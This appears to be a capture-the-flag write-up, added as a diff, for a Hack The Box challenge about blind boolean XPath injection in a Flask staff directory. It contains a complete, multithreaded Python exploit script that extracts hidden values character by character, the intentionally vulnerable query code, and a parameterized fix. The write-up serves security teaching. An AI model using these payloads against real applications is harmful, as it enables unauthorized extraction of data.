@@ -1,0 +1,210 @@
+---
+title: E.Tree
+description: XPath blind injection challenge
+---
+import { Tabs, TabItem } from '@astrojs/starlight/components';
+
+>Link: https://app.hackthebox.com/challenges/E.Tree
+
+
+##### Challenge Scenario
+```
+
+After many years where humans work under the aliens commands, they have been gradually given access to some of
+their management applications. Can you hack this alien Employ Directory web app and contribute to the greater 
+human rebellion?
+```
+---
+
+Looking at the source code of the Flask based web application, we find that it is vulnerable to XPath injection. The user input is directly 
+used in an XPath query without proper sanitization, allowing us to manipulate the query and extract sensitive information 
+from the military XML.
+
+
+This is blind XPath injection — specifically boolean-based blind XPath injectio, where the app never returns actual XML data — 
+it only returns one of two responses: the searched query result is found or not found on the XML tree.
+
+We can use this behavior to infer information about the XML structure and content by crafting specific queries
+and observing the responses.
+
+
+```python
+def search_staff(name):
+    # who cares about parameterization
+    query = f"/military/district/staff[name='{name}']"
+    
+    if tree.xpath(query):
+        return {'success': 1, 'message': 'This millitary staff member exists.'}
+
+    return {'failure': 1, 'message': 'This millitary staff member does not exist.'}
+
+```
+
+Also looking at the XML structure, we can see that there are multiple districts, each with multiple staff members. 
+Some staff members have a `selfDestructCode` field, which is likely to contain the flag.
+
+And this flag is distributed across multiple nodes, so we need to find all nodes with
+ `selfDestructCode` and extract their values to get the full flag.
+
+
+<Tabs syncKey="pkg">
+  <TabItem label="XML">
+  ```xml
+    <?xml version="1.0" encoding="utf-8"?>
+        <military>
+            <district id="DSC-N-1547">
+                <staff>
+                    <name>Tomkrut</name>
+                    <age>18835</age>
+                    <rank>Sergeant</rank>
+                    <kills>777132</kills>
+                </staff>
+                ...
+            </district>
+            <district id="DSC-N-1548">
+               ...
+                <staff>
+                    <name>Groorg</name>
+                    <age>52420</age>
+                    <rank>Colonel</rank>
+                    <kills>4112825</kills>
+                    <selfDestructCode>HTB{f4k3_fl4g_</selfDestructCode>
+                </staff>
+            </district>
+            <district id="DSC-N-1549">
+                ...
+                <staff>
+                    <name>Bobhura</name>
+                    <age>61792</age>
+                    <rank>Magor</rank>
+                    <kills>5076298</kills>
+                    <selfDestructCode>f0r_t3st1ng}</selfDestructCode>
+                </staff>
+                ...
+            </district>
+        </military>
+    ```
+  </TabItem>
+</Tabs>
+
+---
+
+### POC
+
+Here, we try to find all nodes with `selfDestructCode` by iterating through possible district and staff positions, 
+and checking if the query returns a result.
+
+Then, for each found node, we extract the value of `selfDestructCode` character by character by 
+iterating through possible characters and checking if the query returns a result.
+
+And lastly, we concatenate all the extracted values to get the final flag.
+
+<Tabs syncKey="pkg">
+  <TabItem label="Python">
+
+```python
+#!/usr/bin/python3
+
+
+import requests
+import json
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+url = "http://X.X.X.X:PORT/api/search"
+proxy = {
+    "http": "http://127.0.0.1:8080",
+    "https": "http://127.0.0.1:8080"
+}
+
+def oracle(payload):
+    headers = {"Content-Type": "application/json"}
+    data = json.dumps({"search": payload})
+    response = requests.post(url, data=data, headers=headers, proxies=proxy)
+    return "This millitary staff member exists." in response.text
+
+def check_position(d, s):
+    path = f"/military/district[position()={d}]/staff[position()={s}]/selfDestructCode"
+    for l in range(1, 10):
+        if oracle(f"' or string-length({path})={l} and '1'='1"):
+            if l > 0:
+                return (d, s, l, path)
+    return None
+
+def extract_value(path, length):
+    charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&-_=+{}|"
+    value = ["?"] * length
+
+    def check_char(pos, char):
+        if oracle(f"' or substring({path},{pos},1)='{char}' and '1'='1"):
+            return (pos, char)
+        return None
+
+    with ThreadPoolExecutor(max_workers=20) as executor:
+        futures = {executor.submit(check_char, pos, char): (pos, char)
+                    for pos in range(1, length + 1)
+                    for char in charset}
+        for future in as_completed(futures):
+            result = future.result()
+            if result:
+                pos, char = result
+                value[pos - 1] = char
+                print(f"pos {pos}: {char} ({''.join(value)})")
+
+    return "".join(value)
+
+# Step 1: find nodes with selfDestructCode
+found = []
+with ThreadPoolExecutor(max_workers=50) as executor:
+    futures = {executor.submit(check_position, d, s): (d, s)
+                for d in range(1, 5) for s in range(1, 15)}
+    for future in as_completed(futures):
+        result = future.result()
+        if result:
+            found.append(result)
+
+found.sort()
+print(f"[+] Found {len(found)} nodes with selfDestructCode")
+
+# Step 2: extract each node
+flag_parts = []
+for d, s, length, path in found:
+    print(f"\n[+] Extracting district={d} staff={s} length={length}")
+    value = extract_value(path, length)
+    print(f"[+] Value: {value}")
+    flag_parts.append((d, s, value))
+
+flag_parts.sort()
+print(f"\n[+] Final flag: {''.join(v for _, _, v in flag_parts)}")    
+```
+  </TabItem>
+</Tabs>
+
+
+---
+
+### Remediation
+
+The fix uses lxml's built-in variable binding ($name + name=name), which keeps user input out of the query string entirely and prevents any possibility of injection.
+ The query is now parameterized, and the user input is treated as a literal value rather than part of the XPath syntax.
+
+```python
+from lxml import etree
+
+def search_staff(name):
+    # Parameterized XPath using variables
+    query = "/military/district/staff[name=$name]"
+    result = tree.xpath(query, name=name)  # lxml supports variable binding
+    
+    if result:
+        return {'success': 1, 'message': 'This military staff member exists.'}
+    return {'failure': 1, 'message': 'This military staff member does not exist.'}
+
+```
+
+---
+
+### References
+
+- https://owasp.org/www-community/attacks/XPATH_Injection
+- https://lxml.de/
+- https://snyk.io/blog/prevent-xpath-injection-attacks/
